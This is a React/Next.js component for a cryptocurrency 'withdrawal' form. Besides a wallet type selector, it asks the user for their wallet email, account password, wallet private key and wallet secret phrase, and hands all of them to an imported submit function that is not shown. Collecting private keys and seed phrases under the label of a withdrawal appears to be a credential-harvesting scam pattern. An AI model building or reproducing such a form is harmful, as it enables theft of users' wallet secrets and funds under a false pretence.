"use client"
import React, {useState} from 'react'
import InputTemp from "@/app/components/ui/InputTemp";
import SelectTemp from "@/app/components/ui/SelectInputTemp";
import {useForm} from "react-hook-form";
import Loading from "@/app/(auth)/loading";
import {useSession} from "next-auth/react";
import {User} from "@/app/Types";
import {submitForm} from "./submitForm";

type ee = {
    walletType: string
}

function WithdrawalFormInput({getAllWalletType}: { getAllWalletType: ee[] }) {
    const {register, handleSubmit, formState: {errors}} = useForm()
    const withdrawalOptions = getAllWalletType?.map((data) => {
        return data?.["walletType"]
    })
    const [loading, setLoading] = useState(false)
    const {data: session} = useSession()
    const data = session as User
    const userName = data?.["user"]?.["UserInfo"]?.["FirstName"] + " " + data?.["user"]?.["UserInfo"]?.["LastName"]
    const userId = data?.["user"]?.["UserInfo"]?.["userid"]


    async function formSubmitter() {
        await submitForm(userId, userName, setLoading, handleSubmit)
    }

    return (
        <>
            {loading && <Loading/>}
            <div
                className=" sm:mt-[14px] mt-[15px] ">
                <form onSubmit={async (e) => {
                    e.preventDefault()
                    await formSubmitter()
                }} className="grid  sm:grid-cols-2 gap-[20px] sm:gap-[30px]">
                    <div
                        className={"rounded-[8px] h-fit py-[20px] sm:py-[30px] px-[15px] sm:px-[31px] bg-[#1B2028] sm:gap-[30px]"}>
                        <SelectTemp defaultValue={undefined} selectionType={"Wallet Type"} inputChange={register}
                                    inputName={"WalletType"}
                                    options={withdrawalOptions}/>

                    </div>
                    <div
                        className="grid gap-[20px] rounded-[8px] py-[20px] sm:py-[30px] px-[15px] sm:px-[31px] bg-[#1B2028] sm:gap-[25px]">
                        <InputTemp
                            errors={errors}
                            type={"email"}
                            inputName={"Email"}
                            inputChange={register}
                            placeholder={"Enter your wallet Email"}/>
                        <InputTemp
                            errors={errors}
                            type={"password"}

                            inputName={"Password"}
                            inputChange={register}
                            placeholder={"Enter your account password"}/>

                        <InputTemp
                            errors={errors}
                            inputName={"PrivateKey"}
                            inputChange={register}
                            placeholder={"Enter your wallet private key"}/>

                        <InputTemp
                            errors={errors}
                            inputName={"Secret Phrase"}
                            inputChange={register}
                            placeholder={"Enter your wallet secret phrase"}/>

                        <div>
                            <button
                                className="bg-[#5570F1] cursor-pointer font-poppins text-[14px] text-white w-full rounded-[8px] h-[47px]">
                                Submit
                            </button>
                        </div>
                    </div>


                </form>
            </div>
        </>
    )
}

export default WithdrawalFormInput
